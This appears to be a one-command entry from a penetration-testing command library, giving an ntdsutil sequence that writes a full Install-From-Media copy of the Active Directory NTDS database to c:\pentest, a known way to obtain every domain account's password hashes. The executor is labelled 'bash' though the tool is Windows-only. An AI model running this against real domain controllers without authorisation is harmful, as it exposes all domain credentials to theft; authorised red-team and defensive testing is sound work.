---
id: 5ba7d09b-9478-42ab-b695-d5d64f77253c
name: Create full IFM backup of ntds instance
type: command
executor: bash
data: 'ntdsutil

  activate instance ntds

  ifm

  create full c:\pentest

  quit

  quit'
output: null
created_at: '2023-04-06T03:56:03.823883+00:00'
updated_at: '2023-04-10T20:25:43.333839+00:00'
---

# Create full IFM backup of ntds instance

```bash
ntdsutil
activate instance ntds
ifm
create full c:\pentest
quit
quit
```


